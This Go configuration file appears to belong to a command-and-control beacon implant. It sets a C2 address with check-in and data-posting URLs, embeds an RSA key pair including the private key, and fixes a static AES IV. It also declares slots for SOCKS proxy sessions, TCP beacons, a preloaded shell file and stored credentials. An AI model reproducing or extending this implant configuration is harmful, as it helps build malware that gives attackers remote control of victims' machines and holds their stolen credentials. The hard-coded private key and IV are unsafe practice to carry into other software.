package config

import (
	"time"
)

var (
	RsaPublicKey = []byte(`
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCC31IH656l4/G9hVLkz//wAn9hu2Wf6t2WRXQ2
9HAy/AHP1xt6Y1QC/4BWpG/H7vULxQB0NHziGdhgguuGVGPfrmgMVhemRrOuUoK46urOp0tIoTTy
13xSexVPmx2PEirFhtY5K9+re0u8e8Eh8Iam5S5n7zwEmCIR4PZ/qmHyDQIDAQAB
-----END PUBLIC KEY-----	
	`)
	RsaPrivateKey = []byte(`
-----BEGIN PRIVATE KEY-----
MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAILfUgfrnqXj8b2FUuTP//ACf2G7
ZZ/q3ZZFdDb0cDL8Ac/XG3pjVAL/gFakb8fu9QvFAHQ0fOIZ2GCC64ZUY9+uaAxWF6ZGs65Sgrjq
6s6nS0ihNPLXfFJ7FU+bHY8SKsWG1jkr36t7S7x7wSHwhqblLmfvPASYIhHg9n+qYfINAgMBAAEC
gYAF8NtJbsG56BoOL2Iu7t5AZ+yeZCJd2wyKCMcYw4ngVp5CcBJYQPAMXsrVpAtK+Sb4jM3TeJp+
rQusfeTxKR2LdjXXRPcE8QshNCojGBr/7AHVKTbn5QNE/a1m6Vdio9QsGHGokdwpEpAQcQF0nWqj
jGlnNttRU/C3R9Nkkl8qAQJBAKmo6EfKc8JNmfjFMUwX5gPhdDwTQxpuSPpV0dLP05Zdm/hOEaQ+
+wtQcK0mS49qoZGUNAxlNgD23ioL1EIifIECQQDFeToD815lwjfdMjEebbYKQ8fp5tGQNVyh1/cM
sCz3NsCxv2XJIqGTFBQKVStSdYQpGPy0lZCcrBYnEYe3b9+NAkEAokzI2FSd5JSj5M2PWUHLco7s
yMOMf+5ctc3/SXIy8Tdfi2vziHIPakVrZNirk+jn4wIpwGnZ/ZYr9YEXbqTbAQJARVLkcgSazABd
mjKHmdYMBRh8cvmL8iM5jLuDSBoE/xhil0PI2M5miHqQ+nuhxMXqin7yH/ctmEK1WCvISDZm9QJA
aYN+RPN/SOeHSUnnrsq0BGf7/Fg5KXfkAoc+c/0lrkyewlJLV9MMkrH9EidEwS5cawQ/ZE0Ff6gb
tks62JTkIQ==
-----END PRIVATE KEY-----
	`)


	C2        = "0.0.0.0:4445"
	plainHTTP = "http://"
	sslHTTP   = "https://"
	GetUrl    = plainHTTP + C2 + "/api/v1/status"
	PostUrl   = plainHTTP + C2 + "/api/v1/entry?id="
	WaitTime  = 10000 * time.Millisecond
	VerifySSLCert = true
	TimeOut time.Duration  = 10 //seconds

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
	TcpBeacons []TcpBeacon
	SocksSessions []*SocksSession
	ShellPreLoadedFile string
	StoredCredentials *StoredCredential
)

const (
	DebugMode = true
)